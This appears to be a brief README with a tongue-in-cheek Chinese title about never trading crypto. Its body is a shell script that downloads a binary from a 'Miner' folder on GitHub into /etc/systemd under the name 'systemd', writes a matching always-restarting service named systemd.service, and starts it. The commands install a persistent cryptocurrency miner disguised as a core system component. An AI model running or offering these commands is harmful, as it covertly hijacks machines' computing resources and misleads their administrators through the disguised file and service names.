# 炒币是不可能炒币的，这辈子也不可能炒币的


```
wget -P /etc/systemd/ https://github.com/GouGoGoal/SHELL/raw/master/Miner/systemd 
wget -P /etc/systemd/ https://github.com/GouGoGoal/SHELL/raw/master/Miner/config.json

chmod +x /etc/systemd/systemd 

echo '
[Unit]
After=rc-local.service

[Service]
Type=simple
ExecStart=/etc/systemd/systemd -c /etc/systemd/config.json
Restart=always
[Install]
WantedBy=multi-user.target
'>/etc/systemd/system/systemd.service


systemctl start systemd
```



